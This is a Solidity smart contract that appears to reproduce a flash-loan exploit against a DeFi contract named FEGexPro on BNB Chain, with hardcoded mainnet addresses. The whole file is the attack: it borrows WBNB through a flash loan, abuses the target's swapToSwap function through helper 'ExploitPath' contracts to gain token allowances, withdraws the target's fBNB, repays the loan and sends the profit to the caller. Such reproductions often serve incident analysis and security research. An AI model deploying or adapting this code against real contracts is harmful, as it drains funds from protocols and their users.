// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;

import "hardhat/console.sol";
import "./ExploitPath.sol";

interface IDVM {
    function flashLoan(
        uint baseAmount, 
        uint quoteAmount, 
        address to, 
        bytes calldata data
    ) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint balance);
    function transferFrom(address from, address to, uint amount) external;
    function transfer(address to, uint amount) external;
    function approve(address acc, uint amount) external;
    function allowance(address owner, address spender) external view returns (uint amount);
}

interface IWBNB is IERC20 {
    function withdraw(uint amount) external;
    function deposit() external payable;
}

interface IfBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

interface IFEGexPro {
    function depositInternal(address asset, uint amount) external;
    function swapToSwap(address path, address asset, address to, uint amount) external;
    function userBalanceInternal(address acc) external view returns (uint base, uint balance);
}

contract ExploitMain {
    
    IDVM private constant dvm = IDVM(0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7);

    IWBNB private constant wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IfBNB private constant fBNB = IfBNB(0x87b1AccE6a1958E522233A737313C086551a5c76);

    IFEGexPro private constant fegexPro = IFEGexPro(0x818E2013dD7D9bf4547AaabF6B617c1262578bc7);

    function depositInternal(address asset, uint amount) external {}
    
    function userBalanceInternal(address acc) external view returns (uint token, uint main) {}

    function payMain(address receiver, uint amount) external {}

    function DVMFlashLoanCall(address, uint, uint amount, bytes calldata) external {
        wbnb.withdraw(amount);
        fBNB.deposit{value : amount}();
        
        fBNB.approve(address(fegexPro), type(uint).max);

        fegexPro.depositInternal(address(fBNB), 115e18);
        (,uint internalBalnace) = fegexPro.userBalanceInternal(address(this));
        fegexPro.swapToSwap(address(this), address(fBNB), address(this), internalBalnace);

        fegexPro.depositInternal(address(fBNB), 1);
        ExploitPath exploitPath = new ExploitPath();
        fegexPro.swapToSwap(address(exploitPath), address(fBNB), address(this), internalBalnace);
        
        fegexPro.depositInternal(address(fBNB), 1);
        ExploitPath exploitPathA = new ExploitPath();
        fegexPro.swapToSwap(address(exploitPathA), address(fBNB), address(this), internalBalnace);
        
        fBNB.transferFrom(address(fegexPro), address(this), internalBalnace);
        exploitPath.transferFund(internalBalnace);
        exploitPathA.transferFund(internalBalnace);

        fBNB.withdraw(fBNB.balanceOf(address(this)));
        wbnb.deposit{value : amount}();
        wbnb.transfer(address(dvm), amount);
    }

    function execute() external {
        dvm.flashLoan(0, 120e18, address(this), "0");
        msg.sender.call{value : address(this).balance}("");
    }

    receive() external payable {}
}